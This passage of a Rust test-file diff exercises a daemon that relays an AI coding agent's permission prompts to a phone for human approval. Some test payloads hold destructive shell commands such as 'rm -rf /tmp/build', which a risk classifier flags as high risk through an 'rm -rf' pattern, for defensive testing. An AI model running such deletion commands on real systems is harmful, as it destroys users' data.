+                        } => match require.find_match(&on_screen, None) {
+                            None => SupervisorResult::Refused {
+                                reason: "expected prompt not on screen".into(),
+                            },
+                            Some(matched) => {
+                                if expect
+                                    .as_ref()
+                                    .is_some_and(|expect| !expect.still_on_screen(&on_screen))
+                                {
+                                    SupervisorResult::Refused {
+                                        reason: "the prompt on screen is not the one this answer \
+                                                 was created for"
+                                            .into(),
+                                    }
+                                } else {
+                                    typed.lock().unwrap().push(text);
+                                    SupervisorResult::Sent { matched }
+                                }
+                            }
+                        },
+                    };
+                    if let Some(responder) = inflight.lock().unwrap().remove(&id) {
+                        let _ = responder.send(result);
+                    }
+                }
+            });
+        }
+
+        let registration = daemon
+            .register_supervisor(
+                RegisterSession {
+                    session_id: name.to_string(),
+                    session_uid: Some(uid.to_string()),
+                    tmux_session: name.to_string(),
+                    tmux_socket: protocol::TMUX_SOCKET_NAME.to_string(),
+                    cwd: "/tmp".to_string(),
+                    supervisor_pid: 4242,
+                    claude_bin: None,
+                    started_at: protocol::time::now_rfc3339(),
+                    protocol_minor,
+                },
+                tx,
+                Arc::clone(&inflight),
+            )
+            .await
+            .expect("registration must succeed");
+
+        FakeSupervisor {
+            visible: visible_cell,
+            typed,
+            captures,
+            silent,
+            inflight,
+            _registration: registration,
+        }
+    }
+
+    /// Raise a structured permission request the way the hook does.
+    async fn raise_prompt(
+        daemon: &Arc<Daemon>,
+        uid: &str,
+        prompt_id: &str,
+        command: &str,
+    ) -> String {
+        let tool_input = json!({ "command": command });
+        daemon
+            .handle_hook(HookPost {
+                session_id: "cc-1".into(),
+                session_uid: Some(uid.to_string()),
+                event: "PermissionRequest".into(),
+                payload: json!({
+                    "hook_event_name": "PermissionRequest",
+                    "cwd": "/tmp",
+                    "prompt_id": prompt_id,
+                    "tool_name": "Bash",
+                    "tool_input": tool_input,
+                }),
+                wait: false,
+            })
+            .await;
+        format!(
+            "pr-{prompt_id}-{}",
+            &protocol::hash::approval_payload_hash("Bash", &tool_input)[..16]
+        )
+    }
+
+    /// Wait until the daemon has fingerprinted the prompt for this card.
+    async fn wait_bound(daemon: &Arc<Daemon>, uid: &str, request_id: &str) -> bool {
+        for _ in 0..40 {
+            {
+                let inner = daemon.inner.lock().await;
+                if inner
+                    .pending
+                    .get(&(uid.to_string(), request_id.to_string()))
+                    .is_some_and(|entry| entry.prompt.is_some())
+                {
+                    return true;
+                }
+            }
+            tokio::time::sleep(Duration::from_millis(25)).await;
+        }
+        false
+    }
+
+    async fn tool_call(daemon: &Arc<Daemon>, name: &str, uid: &str, tool_use_id: &str) {
+        daemon
+            .handle_hook(HookPost {
+                session_id: name.into(),
+                session_uid: Some(uid.to_string()),
+                event: "PreToolUse".into(),
+                payload: json!({
+                    "hook_event_name": "PreToolUse",
+                    "cwd": "/tmp",
+                    "tool_name": "Bash",
+                    "tool_input": {"command": "echo hi"},
+                    "tool_use_id": tool_use_id,
+                }),
+                wait: false,
+            })
+            .await;
+    }
+
+    #[tokio::test]
+    async fn a_new_cc_1_gets_its_own_identity_log_and_numbering() {
+        // Name reuse, end to end through the daemon: spawn `cc-1`, kill it,
+        // spawn `cc-1` again. Two runs, two uids, two logs, no interleaving.
+        let daemon = test_daemon();
+
+        let first = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
+        for i in 0..4 {
+            tool_call(&daemon, "cc-1", &first.session.uid, &format!("toolu_a{i}")).await;
+        }
+        daemon
+            .session_exited("cc-1", Some(&first.session.uid), Some(0))
+            .await;
+
+        let second = register(&daemon, "cc-1", Some("01K1B3XZZZC0DE5FGH7JKMNPQR")).await;
+        for i in 0..2 {
+            tool_call(&daemon, "cc-1", &second.session.uid, &format!("toolu_b{i}")).await;
+        }
+
+        assert_ne!(
+            first.session.uid, second.session.uid,
+            "two runs, two identities"
+        );
+        assert_eq!(
+            first.session.name, second.session.name,
+            "…sharing one tmux name"
+        );
+
+        // Two logs. The new run starts at 1 rather than continuing from where
+        // the dead one stopped.
+        let old: Vec<u64> = daemon
+            .store
+            .events_after(&first.session.uid, 0, 100)
+            .unwrap()
+            .iter()
+            .map(|e| e.seq)
+            .collect();
+        let new: Vec<u64> = daemon
+            .store
+            .events_after(&second.session.uid, 0, 100)
+            .unwrap()
+            .iter()
+            .map(|e| e.seq)
+            .collect();
+        assert_eq!(old, (1..=old.len() as u64).collect::<Vec<_>>());
+        assert_eq!(new, (1..=new.len() as u64).collect::<Vec<_>>());
+        assert!(new.len() < old.len(), "the new run has only its own events");
+
+        // No interleaving: every event in each log names its own run, and the
+        // dead run gained nothing after the new one started.
+        for event in daemon
+            .store
+            .events_after(&first.session.uid, 0, 100)
+            .unwrap()
+        {
+            assert_eq!(event.session_uid, first.session.uid);
+            assert!(
+                !event
+                    .source_event_id
+                    .as_deref()
+                    .unwrap_or("")
+                    .contains("toolu_b"),
+                "the dead run must not gain the live run's events: {event:?}"
+            );
+        }
+        for event in daemon
+            .store
+            .events_after(&second.session.uid, 0, 100)
+            .unwrap()
+        {
+            assert_eq!(event.session_uid, second.session.uid);
+            assert!(!event
+                .source_event_id
+                .as_deref()
+                .unwrap_or("")
+                .contains("toolu_a"));
+        }
+
+        // Both are listed, distinguishable, with independent watermarks.
+        let sessions = daemon.sessions().await.unwrap();
+        assert_eq!(sessions.len(), 2);
+        assert!(sessions.iter().all(|s| s.session_id == "cc-1"));
+        let uids: Vec<&str> = sessions.iter().map(|s| s.session_uid.as_str()).collect();
+        assert!(
+            uids.contains(&first.session.uid.as_str())
+                && uids.contains(&second.session.uid.as_str())
+        );
+        assert_eq!(
+            sessions
+                .iter()
+                .find(|s| s.session_uid == first.session.uid)
+                .unwrap()
+                .lifecycle,
+            Lifecycle::Exited
+        );
+
+        // And a client that only knows the name reaches the live one.
+        assert_eq!(
+            daemon.resolve("cc-1").await.unwrap().session_uid,
+            second.session.uid
+        );
+    }
+
+    #[test]
+    fn the_launchd_sentinel_is_not_mistaken_for_a_job() {
+        // Guards a sentence, and the debugging it would cause: macOS hands a
+        // shell-started process `XPC_SERVICE_NAME=0`, and reporting that as a
+        // label makes `cc daemon status` claim a hand-started daemon belongs to
+        // "a different job (0)".
+        //
+        // `HOME` is process-global and these tests run in threads, but no other
+        // test touches this variable, and the guard restores it either way.
+        struct Restore(Option<String>);
+        impl Drop for Restore {
+            fn drop(&mut self) {
+                match &self.0 {
+                    Some(value) => std::env::set_var("XPC_SERVICE_NAME", value),
+                    None => std::env::remove_var("XPC_SERVICE_NAME"),
+                }
+            }
+        }
+        let _restore = Restore(std::env::var("XPC_SERVICE_NAME").ok());
+
+        std::env::set_var("XPC_SERVICE_NAME", "0");
+        assert_eq!(launchd_label(), None, "0 means 'not an XPC service'");
+        std::env::set_var("XPC_SERVICE_NAME", "");
+        assert_eq!(launchd_label(), None);
+        std::env::remove_var("XPC_SERVICE_NAME");
+        assert_eq!(launchd_label(), None);
+
+        // A real label is passed through, ours or not — "managed by somebody
+        // else" is a distinct problem and must stay visible.
+        std::env::set_var("XPC_SERVICE_NAME", protocol::LAUNCHD_LABEL);
+        assert_eq!(launchd_label().as_deref(), Some(protocol::LAUNCHD_LABEL));
+        std::env::set_var("XPC_SERVICE_NAME", "com.example.other");
+        assert_eq!(launchd_label().as_deref(), Some("com.example.other"));
+    }
+
+    #[tokio::test]
+    async fn a_bare_name_resolves_to_the_run_that_is_actually_there() {
+        // `lifecycle` can be stale: a session that ended while the daemon was
+        // down was never observed exiting, so it is still recorded `Live` and
+        // would outrank the run a human means by `cc-1`. A supervisor being
+        // attached is the only positive evidence, and it wins.
+        let daemon = test_daemon();
+
+        // An older run that looks alive on paper and has nothing behind it.
+        let ghost = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
+        daemon.unregister_supervisor(&ghost).await;
+        assert_eq!(
+            daemon
+                .store
+                .get_session(&ghost.session.uid)
+                .unwrap()
+                .unwrap()
+                .lifecycle,
+            Lifecycle::Live,
+            "the ghost is still recorded live, which is the whole problem"
+        );
+
+        // A newer run that is genuinely attached.
+        let live = register(&daemon, "cc-1", Some("01K1B3XZZZC0DE5FGH7JKMNPQR")).await;
+        assert_eq!(
+            daemon.resolve("cc-1").await.unwrap().session_uid,
+            live.session.uid
+        );
+
+        // With nothing attached, the store's policy takes over — and a uid is
+        // always exact, whatever is attached.
+        daemon.unregister_supervisor(&live).await;
+        assert!(daemon.resolve("cc-1").await.is_ok());
+        assert_eq!(
+            daemon
+                .resolve(&ghost.session.uid)
+                .await
+                .unwrap()
+                .session_uid,
+            ghost.session.uid
+        );
+        assert!(daemon.resolve("cc-9").await.is_err());
+    }
+
+    #[tokio::test]
+    async fn a_supervisor_s_old_connection_cannot_detach_its_new_one() {
+        // A supervisor whose link drops reconnects and registers again under the
+        // same uid. The losing connection's teardown can land afterwards, and
+        // removing the slot by uid alone would detach the supervisor that had
+        // just replaced it — leaving a live session that cannot be typed into
+        // and a `detached` link that never recovers.
+        let daemon = test_daemon();
+        let first = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
+        let second = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
+        assert_eq!(first.session.uid, second.session.uid, "one run, two links");
+
+        daemon.unregister_supervisor(&first).await;
+        assert_eq!(
+            daemon.sessions().await.unwrap()[0].link,
+            Link::Attached,
+            "the reconnected supervisor must still hold the session"
+        );
+
+        // The current registration releases it, as it should.
+        daemon.unregister_supervisor(&second).await;
+        assert_eq!(daemon.sessions().await.unwrap()[0].link, Link::Detached);
+    }
+
+    #[tokio::test]
+    async fn a_hook_without_a_uid_continues_a_live_run_but_never_a_dead_one() {
+        // The in-place upgrade path (a session whose settings file predates the
+        // flag) and the restart path, which must not be the same answer.
+        let daemon = test_daemon();
+        let live = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
+
+        daemon
+            .handle_hook(HookPost {
+                session_id: "cc-1".into(),
+                session_uid: None,
+                event: "PreToolUse".into(),
+                payload: json!({
+                    "hook_event_name": "PreToolUse",
+                    "cwd": "/tmp",
+                    "tool_use_id": "toolu_legacy",
+                }),
+                wait: false,
+            })
+            .await;
+        assert_eq!(
+            daemon.store.max_seq(&live.session.uid).unwrap(),
+            2,
+            "a uid-less hook must continue the live run, not fork it"
+        );
+        assert_eq!(daemon.sessions().await.unwrap().len(), 1);
+
+        // Once that run has exited, the same hook is a *new* run: `cc-1` having
+        // ended and `cc-1` having restarted are indistinguishable from a name.
+        daemon
+            .session_exited("cc-1", Some(&live.session.uid), Some(0))
+            .await;
+        daemon
+            .handle_hook(HookPost {
+                session_id: "cc-1".into(),
+                session_uid: None,
+                event: "SessionStart".into(),
+                payload: json!({"hook_event_name": "SessionStart", "cwd": "/tmp"}),
+                wait: false,
+            })
+            .await;
+        let sessions = daemon.sessions().await.unwrap();
+        assert_eq!(sessions.len(), 2, "an exited run must not gain new events");
+        let adopted = sessions
+            .iter()
+            .find(|s| s.session_uid != live.session.uid)
+            .unwrap();
+        assert!(protocol::uid::is_well_formed(&adopted.session_uid));
+        assert_eq!(adopted.last_seq, 1);
+    }
+
+    #[tokio::test]
+    async fn an_approval_answered_in_one_run_leaves_the_next_run_s_card_open() {
+        // Approval safety, which is why the ledger is keyed per run: the same
+        // `request_id` in a later `cc-1` must be answerable, not reported as an
+        // already-applied duplicate of a decision nobody made for it.
+        let daemon = test_daemon();
+        let first = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
+        daemon
+            .store
+            .record_answer(
+                &first.session.uid,
+                "toolu_shared",
+                "hash",
+                &AnswerOutcome {
+                    request_id: "toolu_shared".into(),
+                    session_id: "cc-1".into(),
+                    decision: AnswerDecision::Allow,
+                    resolved_by: ResolvedBy::Phone,
+                    applied_via: AnswerPath::SendKeys,
+                    resolved_at: protocol::time::now_rfc3339(),
+                    detail: None,
+                    inferred: false,
+                    indeterminate: false,
+                },
+            )
+            .unwrap();
+        daemon
+            .session_exited("cc-1", Some(&first.session.uid), Some(0))
+            .await;
+
+        let second = register(&daemon, "cc-1", Some("01K1B3XZZZC0DE5FGH7JKMNPQR")).await;
+        assert!(
+            daemon
+                .store
+                .get_answer(&second.session.uid, "toolu_shared")
+                .unwrap()
+                .is_none(),
+            "the new run has answered nothing"
+        );
+        // Naming the new run explicitly, an answer is not a duplicate — it is
+        // rejected only because there is no such card open, which is the
+        // correct and *different* outcome.
+        let result = daemon
+            .answer(
+                "toolu_shared",
+                "hash",
+                AnswerDecision::Allow,
+                Some(&second.session.uid),
+            )
+            .await;
+        match result {
+            AnswerResult::Rejected { reason } => {
+                assert!(reason.contains("unknown"), "{reason}");
+            }
+            other => panic!("must not resolve from another run's ledger: {other:?}"),
+        }
+    }
+
+    /// Raise a `PermissionRequest` with no correlating PreToolUse, which is the
+    /// normal case on this Claude build — and the one where the request id is
+    /// derived from the command rather than from an agent-side identity.
+    async fn uncorrelated_approval(daemon: &Arc<Daemon>, name: &str, uid: &str) -> String {
+        let tool_input = json!({"command": "git status"});
+        daemon
+            .handle_hook(HookPost {
+                session_id: name.into(),
+                session_uid: Some(uid.to_string()),
+                event: "PermissionRequest".into(),
+                payload: json!({
+                    "hook_event_name": "PermissionRequest",
+                    "cwd": "/tmp",
+                    "tool_name": "Bash",
+                    "tool_input": tool_input,
+                }),
+                wait: false,
+            })
+            .await;
+        format!(
+            "pr-noprompt-{}",
+            &protocol::hash::approval_payload_hash("Bash", &tool_input)[..16]
+        )
+    }
+
+    #[tokio::test]
+    async fn an_answer_scoped_only_by_name_is_refused_when_two_runs_share_the_card() {
+        // The collision is real, not theoretical: an uncorrelated approval's
+        // request id is `pr-noprompt-<hash of tool+input>`, so two runs of the
+        // same command produce the same id *and* the same payload hash — which
+        // means the staleness guard downstream would not catch the mix-up
+        // either. Answering the wrong agent's prompt types into the wrong TTY,
+        // so this must refuse rather than pick.
+        let daemon = test_daemon();
+        let first = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
+        let request_id = uncorrelated_approval(&daemon, "cc-1", &first.session.uid).await;
+
+        // A ghost: same name, same command, never observed exiting.
+        let second = register(&daemon, "cc-1", Some("01K1B3XZZZC0DE5FGH7JKMNPQR")).await;
+        let same_id = uncorrelated_approval(&daemon, "cc-1", &second.session.uid).await;
+        assert_eq!(request_id, same_id, "the ids must actually collide");
+
+        let hash = protocol::hash::approval_payload_hash("Bash", &json!({"command": "git status"}));
+        match daemon
+            .answer(&request_id, &hash, AnswerDecision::Allow, Some("cc-1"))
+            .await
+        {
+            AnswerResult::Rejected { reason } => {
+                assert!(reason.contains("more than one run"), "{reason}");
+            }
+            other => panic!("a name must not pick between two open cards: {other:?}"),
+        }
+        // …and the same refusal with no scope at all, which is the case a
+        // protocol-minor-1 client hits.
+        assert!(matches!(
+            daemon
+                .answer(&request_id, &hash, AnswerDecision::Allow, None)
+                .await,
+            AnswerResult::Rejected { .. }
+        ));
+
+        // Naming the run exactly is always answerable: that is what the uid is
+        // for, and it is the instruction the refusal gives.
+        let outcome = daemon
+            .answer(
+                &request_id,
+                &hash,
+                AnswerDecision::Allow,
+                Some(&second.session.uid),
+            )
+            .await;
+        assert!(
+            !matches!(&outcome, AnswerResult::Rejected { reason } if reason.contains("more than one")),
+            "a uid is unambiguous by construction: {outcome:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_name_scoped_answer_reaches_the_only_run_holding_the_card() {
+        // The other half: scoping by name must keep working when there is no
+        // collision, or every legacy client loses the ability to answer.
+        let daemon = daemon_with(Config {
+            supervisor_timeout_ms: 50,
+            ..Config::default()
+        });
+        let session = register(&daemon, "cc-1", Some("01K1B3XQ8ZC0DE5FGH7JKMNPQR")).await;
+        let request_id = uncorrelated_approval(&daemon, "cc-1", &session.session.uid).await;
+        let hash = protocol::hash::approval_payload_hash("Bash", &json!({"command": "git status"}));
+
+        // No supervisor can type, so this cannot be `Applied` — but it must
+        // reach the injection attempt rather than be refused for ambiguity.
+        match daemon
+            .answer(&request_id, &hash, AnswerDecision::Allow, Some("cc-1"))
+            .await
+        {
+            AnswerResult::Rejected { reason } => {
+                assert!(
+                    !reason.contains("more than one") && !reason.contains("unknown"),
+                    "the card was reachable; it failed at injection: {reason}"
+                );
+            }
+            other => panic!("unexpected: {other:?}"),
+        }
+        // A name nobody has ever used is still an honest error.
+        assert!(matches!(
+            daemon.answer(&request_id, &hash, AnswerDecision::Allow, Some("cc-9")).await,
+            AnswerResult::Rejected { reason } if reason.contains("unknown session")
+        ));
+    }
+
+    #[tokio::test]
+    async fn concurrent_taps_on_one_card_produce_one_outcome_not_a_rejection() {
+        // A duplicate must return the original outcome. Before this was
+        // serialised, a second tap arriving *during* the first one's injection
+        // got `Rejected{already being applied}` — which a phone on a flaky link
+        // renders as a failure for an answer that did apply.
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("echo hi"), "").await;
+        let card = raise_prompt(&daemon, uid, "p1", "echo hi").await;
+        assert!(wait_bound(&daemon, uid, &card).await);
+        let hash = protocol::hash::approval_payload_hash("Bash", &json!({"command": "echo hi"}));
+
+        let mut tasks = Vec::new();
+        for _ in 0..8 {
+            let daemon = Arc::clone(&daemon);
+            let (card, hash) = (card.clone(), hash.clone());
+            tasks.push(tokio::spawn(async move {
+                daemon
+                    .answer(&card, &hash, AnswerDecision::Allow, Some(TEST_UID))
+                    .await
+            }));
+        }
+        let mut results = Vec::new();
+        for task in tasks {
+            results.push(task.await.unwrap());
+        }
+        assert!(
+            !results.iter().any(|r| matches!(
+                r,
+                AnswerResult::Rejected { reason } if reason.contains("already being applied")
+            )),
+            "a racing duplicate must never be told the answer is in flight: {results:?}"
+        );
+
+        // Exactly one reaches the agent and the rest replay it — the durable
+        // claim is what makes that true even for a tap that lands *during* the
+        // injection, which is the case a ledger check alone cannot catch.
+        let applied: Vec<&AnswerOutcome> = results
+            .iter()
+            .filter_map(|r| match r {
+                AnswerResult::Applied { outcome } => Some(outcome),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            applied.len(),
+            1,
+            "exactly one answer may be typed: {results:?}"
+        );
+        let duplicates = results
+            .iter()
+            .filter(|r| matches!(r, AnswerResult::Duplicate { .. }))
+            .count();
+        assert_eq!(duplicates, 7, "{results:?}");
+        assert_eq!(
+            pane.typed(),
+            vec!["1".to_string()],
+            "eight taps, one keystroke"
+        );
+    }
+
+    // ------------------------------------------------------- hook mapping
+
+    #[tokio::test]
+    async fn the_stop_hook_records_a_turn_not_a_session_end() {
+        let daemon = test_daemon();
+        daemon
+            .handle_hook(HookPost {
+                session_id: "cc-1".into(),
+                session_uid: Some(TEST_UID.to_string()),
+                event: "Stop".into(),
+                payload: json!({"hook_event_name": "Stop", "session_id": "uuid", "cwd": "/tmp"}),
+                wait: false,
+            })
+            .await;
+        let events = daemon.store.events_after(TEST_UID, 0, 10).unwrap();
+        let kinds: Vec<&EventKind> = events.iter().map(|e| &e.kind).collect();
+        assert!(kinds.contains(&&EventKind::TurnComplete), "{kinds:?}");
+        assert!(
+            !kinds.contains(&&EventKind::SessionEnd),
+            "a finished turn is not a finished session: {kinds:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_real_session_end_still_reports_session_end() {
+        let daemon = test_daemon();
+        // The run has to exist before it can end: an exit reported for a session
+        // nobody registered is a bug to log, not an event to invent.
+        daemon
+            .handle_hook(HookPost {
+                session_id: "cc-1".into(),
+                session_uid: Some(TEST_UID.to_string()),
+                event: "SessionStart".into(),
+                payload: json!({"hook_event_name": "SessionStart", "cwd": "/tmp"}),
+                wait: false,
+            })
+            .await;
+        daemon.session_exited("cc-1", Some(TEST_UID), Some(0)).await;
+        let kinds: Vec<EventKind> = daemon
+            .store
+            .events_after(TEST_UID, 0, 10)
+            .unwrap()
+            .into_iter()
+            .map(|e| e.kind)
+            .collect();
+        assert!(kinds.contains(&EventKind::SessionEnd), "{kinds:?}");
+    }
+
+    #[tokio::test]
+    async fn an_exit_for_a_session_this_daemon_never_saw_is_dropped() {
+        // The half of the defect that lives here: with no row for the run, the
+        // exit has nothing to attach to and is discarded. This is the *before*
+        // state, asserted so the fix below is visibly a fix and not a
+        // coincidence — a session that started and ended while ccd was down
+        // vanished entirely, and there was no evidence anywhere that an agent
+        // had run at all.
+        let daemon = test_daemon();
+        daemon.session_exited("cc-9", Some(TEST_UID), Some(0)).await;
+        assert!(
+            daemon
+                .store
+                .events_after(TEST_UID, 0, 10)
+                .unwrap()
+                .is_empty(),
+            "an unknown session has nowhere to record an exit"
+        );
+        assert!(daemon.sessions().await.unwrap().is_empty());
+    }
+
+    #[tokio::test]
+    async fn a_session_that_began_and_ended_while_the_daemon_was_down_still_lands() {
+        // What the supervisor now does on that same connection: replay its
+        // registration, *then* report the exit. The daemon has never heard of
+        // this run — no `SessionStart`, no hook, no prior registration — and it
+        // still ends up in the fleet with a terminal `SessionEnd`.
+        let daemon = test_daemon();
+        let registration = register(&daemon, "cc-9", Some(TEST_UID)).await;
+        assert_eq!(registration.session.uid, TEST_UID);
+        daemon.session_exited("cc-9", Some(TEST_UID), Some(0)).await;
+
+        let kinds: Vec<EventKind> = daemon
+            .store
+            .events_after(TEST_UID, 0, 10)
+            .unwrap()
+            .into_iter()
+            .map(|event| event.kind)
+            .collect();
+        assert!(
+            kinds.contains(&EventKind::SessionEnd),
+            "the run's end must be a durable fact: {kinds:?}"
+        );
+        let sessions = daemon.sessions().await.unwrap();
+        assert_eq!(sessions.len(), 1, "the run must appear in the fleet");
+        assert_eq!(sessions[0].session_uid, TEST_UID);
+        assert_eq!(
+            daemon
+                .store
+                .get_session(TEST_UID)
+                .unwrap()
+                .unwrap()
+                .lifecycle,
+            Lifecycle::Exited,
+        );
+    }
+
+    // ------------------------------------------------------------ risk
+
+    #[tokio::test]
+    async fn approval_cards_carry_a_risk_class() {
+        let daemon = test_daemon();
+        daemon
+            .handle_hook(HookPost {
+                session_id: "cc-1".into(),
+                session_uid: Some(TEST_UID.to_string()),
+                event: "PermissionRequest".into(),
+                payload: json!({
+                    "hook_event_name": "PermissionRequest",
+                    "session_id": "uuid",
+                    "cwd": "/tmp",
+                    "prompt_id": "p1",
+                    "tool_name": "Bash",
+                    "tool_input": {"command": "rm -rf /tmp/build"},
+                }),
+                wait: false,
+            })
+            .await;
+
+        let event = daemon
+            .store
+            .events_after(TEST_UID, 0, 10)
+            .unwrap()
+            .into_iter()
+            .find(|e| e.kind == EventKind::ApprovalRequest)
+            .expect("an approval must be logged");
+        assert_eq!(event.payload["card"]["risk"]["class"], "high");
+        assert_eq!(event.payload["card"]["risk"]["matched_pattern"], "rm -rf");
+    }
+
+    #[tokio::test]
+    async fn a_read_only_tool_is_classified_low() {
+        let daemon = test_daemon();
+        daemon
+            .handle_hook(HookPost {
+                session_id: "cc-1".into(),
+                session_uid: Some(TEST_UID.to_string()),
+                event: "PermissionRequest".into(),
+                payload: json!({
+                    "hook_event_name": "PermissionRequest",
+                    "tool_name": "Read",
+                    "tool_input": {"file_path": "/tmp/x"},
+                }),
+                wait: false,
+            })
+            .await;
+        let event = daemon
+            .store
+            .events_after(TEST_UID, 0, 10)
+            .unwrap()
+            .into_iter()
+            .find(|e| e.kind == EventKind::ApprovalRequest)
+            .unwrap();
+        assert_eq!(event.payload["card"]["risk"]["class"], "low");
+        assert!(event.payload["card"]["risk"]["matched_pattern"].is_null());
+    }
+
+    // ------------------------------------------------- local resolution
+
+    /// Drive a PermissionRequest and then its PostToolUse, as a real session
+    /// does when the operator approves at the keyboard.
+    async fn approve_at_the_keyboard(daemon: &Arc<Daemon>) -> String {
+        let tool_input = json!({"command": "touch /tmp/x"});
+        daemon
+            .handle_hook(HookPost {
+                session_id: "cc-1".into(),
+                session_uid: Some(TEST_UID.to_string()),
+                event: "PreToolUse".into(),
+                payload: json!({
+                    "hook_event_name": "PreToolUse",
+                    "prompt_id": "p1",
+                    "tool_name": "Bash",
+                    "tool_input": tool_input,
+                    "tool_use_id": "toolu_local",
+                }),
+                wait: false,
+            })
+            .await;
+        daemon
+            .handle_hook(HookPost {
+                session_id: "cc-1".into(),
+                session_uid: Some(TEST_UID.to_string()),
+                event: "PermissionRequest".into(),
+                payload: json!({
+                    "hook_event_name": "PermissionRequest",
+                    "prompt_id": "p1",
+                    "tool_name": "Bash",
+                    "tool_input": tool_input,
+                }),
+                wait: false,
+            })
+            .await;
+        "toolu_local".to_string()
+    }
+
+    #[tokio::test]
+    async fn a_tool_result_resolves_its_approval_as_answered_locally() {
+        let daemon = test_daemon();
+        let request_id = approve_at_the_keyboard(&daemon).await;
+        assert_eq!(
+            daemon.sessions().await.unwrap()[0].blocked_on,
+            vec![request_id.clone()]
+        );
+
+        // The tool ran, which only happens if a human approved it.
+        daemon
+            .handle_hook(HookPost {
+                session_id: "cc-1".into(),
+                session_uid: Some(TEST_UID.to_string()),
+                event: "PostToolUse".into(),
+                payload: json!({
+                    "hook_event_name": "PostToolUse",
+                    "tool_name": "Bash",
+                    "tool_use_id": request_id,
+                }),
+                wait: false,
+            })
+            .await;
+        daemon.sweep_local_resolutions().await;
+
+        assert!(
+            daemon.sessions().await.unwrap()[0].blocked_on.is_empty(),
+            "the card must stop asking once it has been answered"
+        );
+        let (_, outcome) = daemon
+            .store
+            .get_answer(TEST_UID, &request_id)
+            .unwrap()
+            .unwrap();
+        assert_eq!(outcome.resolved_by, ResolvedBy::Local);
+        assert_eq!(outcome.decision, AnswerDecision::Allow);
+        assert!(!outcome.inferred, "a tool that ran is an observation");
+
+        // And a late tap from the phone is a no-op returning that outcome.
+        let late = daemon
+            .answer(&request_id, "any-hash", AnswerDecision::Deny, None)
+            .await;
+        assert!(matches!(late, AnswerResult::Duplicate { .. }), "{late:?}");
+    }
+
+    #[tokio::test]
+    async fn an_unanswered_approval_is_left_alone_during_the_grace_period() {
+        // The expensive mistake would be resolving a card the human has not
+        // answered: it would vanish from the phone while the Mac still waits.
+        let daemon = test_daemon();
+        let request_id = approve_at_the_keyboard(&daemon).await;
+        for _ in 0..3 {
+            daemon.sweep_local_resolutions().await;
+        }
+        assert_eq!(
+            daemon.sessions().await.unwrap()[0].blocked_on,
+            vec![request_id],
+            "nothing observed means nothing resolved"
+        );
+    }
+
+    #[tokio::test]
+    async fn an_unreadable_pane_is_not_treated_as_an_absent_prompt() {
+        // No supervisor is attached, so `capture` fails. That is "we cannot
+        // see", not "the prompt is gone", and must resolve nothing even long
+        // after the grace period.
+        let daemon = daemon_with(Config {
+            local_resolve_grace_ms: 1,
+            ..Config::default()
+        });
+        let request_id = approve_at_the_keyboard(&daemon).await;
+        tokio::time::sleep(Duration::from_millis(5)).await;
+        for _ in 0..5 {
+            daemon.sweep_local_resolutions().await;
+        }
+        assert_eq!(
+            daemon.sessions().await.unwrap()[0].blocked_on,
+            vec![request_id]
+        );
+    }
+
+    #[tokio::test]
+    async fn local_resolution_can_be_switched_off() {
+        let daemon = daemon_with(Config {
+            local_resolve: false,
+            ..Config::default()
+        });
+        let request_id = approve_at_the_keyboard(&daemon).await;
+        daemon
+            .handle_hook(HookPost {
+                session_id: "cc-1".into(),
+                session_uid: Some(TEST_UID.to_string()),
+                event: "PostToolUse".into(),
+                payload: json!({
+                    "hook_event_name": "PostToolUse",
+                    "tool_use_id": request_id,
+                }),
+                wait: false,
+            })
+            .await;
+        daemon.sweep_local_resolutions().await;
+        assert_eq!(
+            daemon.sessions().await.unwrap()[0].blocked_on,
+            vec![request_id]
+        );
+    }
+
+    // ======================================================== prompt identity
+
+    #[tokio::test]
+    async fn an_answer_bound_to_prompt_n_is_refused_once_prompt_n_plus_1_is_on_screen() {
+        // Two prompts in a row, worded identically because Claude words them
+        // identically — "Do you want to proceed", the same three options, the
+        // same footer. A presence check cannot tell them apart, which is
+        // precisely why the card carries a generation.
+        //
+        // Answering the first card once the second is up used to type "1" into
+        // the second prompt: an approval for a command nobody read.
+        let daemon = test_daemon();
+        let uid = TEST_UID;
+        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
+
+        let first = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
+        assert!(wait_bound(&daemon, uid, &first).await, "prompt 1 must bind");
+
+        // The human answered prompt 1 at the keyboard; Claude asks the next
+        // thing. Same wording, different command.
+        pane.show(&permission_pane("rm -rf /tmp/b"));
+        let second = raise_prompt(&daemon, uid, "p2", "rm -rf /tmp/b").await;
+        assert!(
+            wait_bound(&daemon, uid, &second).await,
+            "prompt 2 must bind"
+        );
+        assert_ne!(first, second);
+
+        let stale_hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));
+        let result = daemon
+            .answer(&first, &stale_hash, AnswerDecision::Allow, Some(uid))
+            .await;
+        match &result {
+            AnswerResult::Rejected { reason } => {
+                assert!(
+                    reason.contains("superseded") || reason.contains("prompt"),
+                    "the refusal must say why: {reason}"
+                );
+            }
+            other => panic!("an answer for a replaced prompt must be refused: {other:?}"),
+        }
+        assert!(
+            pane.typed().is_empty(),
+            "nothing may be typed for a superseded card: {:?}",
+            pane.typed()
+        );
+
+        // The current card is still perfectly answerable — the guard is about
+        // identity, not about being cautious in general.
+        let live_hash =
+            protocol::hash::approval_payload_hash("Bash", &json!({"command": "rm -rf /tmp/b"}));
+        let applied = daemon
+            .answer(&second, &live_hash, AnswerDecision::Allow, Some(uid))
+            .await;
+        assert!(
+            matches!(applied, AnswerResult::Applied { .. }),
+            "the live card must still work: {applied:?}"
+        );
+        assert_eq!(pane.typed(), vec!["1".to_string()]);
+    }
+
+    #[tokio::test]
